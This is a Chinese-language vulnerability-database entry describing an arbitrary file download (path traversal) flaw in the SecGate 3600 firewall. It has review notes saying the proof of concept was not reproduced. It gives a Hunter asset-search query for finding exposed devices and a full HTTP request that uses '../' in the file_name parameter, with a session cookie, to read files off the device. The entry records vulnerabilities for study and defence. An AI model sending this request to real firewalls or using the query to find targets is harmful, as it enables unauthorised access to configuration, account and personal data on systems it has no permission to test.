---
source: "wy876 漏洞文库"
id: "vw-345cd4b4364729a29a4c9c1d"
entity_id: "ve-345cd4b4364729a29a4c9c1d"
schema_version: "1"
title: "网神SecGate 3600防火墙存在任意文件下载漏洞"
product: "网神SecGate3600防火墙"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "含__s_sessionid__，版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/360/%E7%BD%91%E7%A5%9ESecGata3600%E9%98%B2%E7%81%AB%E5%A2%99%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/bql4k8u8x1l3ar5t"
source_status: "recorded"
previous_fofa_unverified: "app.name="
hunter: "app.name=\"网神 SecGate\""
---

# 网神SecGate 3600防火墙存在任意文件下载漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：网神SecGate3600防火墙
- 本文讨论：sys_export_conf_local_save file_name越界读取
- 版本、权限与配置前提：含__s_sessionid__，版本未知
- 资料类型：文件下载请求；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- SecGata拼写错误，360分类错误关联
- 带会话且无响应，权限/可读范围未证明；Hunter语法误标FOFA及残缺
- 已落实的文本修订：“SecGata”改为“SecGate”；HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 会话角色、越界响应与固件待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
网神SecGate 3600防火墙存在任意文件下载漏洞

# 二、影响版本
+ 网神SecGate 3600防火墙

# 三、资产测绘
+ hunter`app.name="网神 SecGate"`
+ 特征


# 四、漏洞复现
```http
GET /?g=sys_export_conf_local_save&file_name=../modules/system/import_export.mds HTTP/1.1
Host: xx.xx.xx.xx
Cookie: __s_sessionid__=5543sd9rcbiklqs1ttignkqvt6
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bql4k8u8x1l3ar5t>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
